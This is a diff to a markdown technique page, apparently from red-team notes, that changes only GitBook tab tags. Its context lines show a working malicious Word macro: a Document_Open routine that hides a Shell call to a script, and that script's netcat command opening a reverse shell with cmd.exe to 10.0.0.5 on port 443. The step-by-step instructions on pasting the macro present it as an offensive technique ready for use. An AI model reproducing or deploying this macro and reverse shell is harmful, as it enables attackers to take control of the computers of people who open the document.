@@ -12,24 +12,24 @@ This technique will build a primitive word document that will auto execute the V
 2. Hit ALT+F11 to go into Macro editor
 3. Double click into the "This document" and CTRL+C/V the below:
 
-{% code-tabs %}
-{% code-tabs-item title="macro" %}
+{% tabs %}
+{% tab title="macro" %}
 ```javascript
 Private Sub Document_Open()
   MsgBox "game over", vbOKOnly, "game over"
   a = Shell("C:\tools\shell.cmd", vbHide)
 End Sub
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
-{% code-tabs %}
-{% code-tabs-item title="C:\\tools\\shell.cmd" %}
+{% tabs %}
+{% tab title="C:\\tools\\shell.cmd" %}
 ```csharp
 C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 This is how it should look roughly in:
 
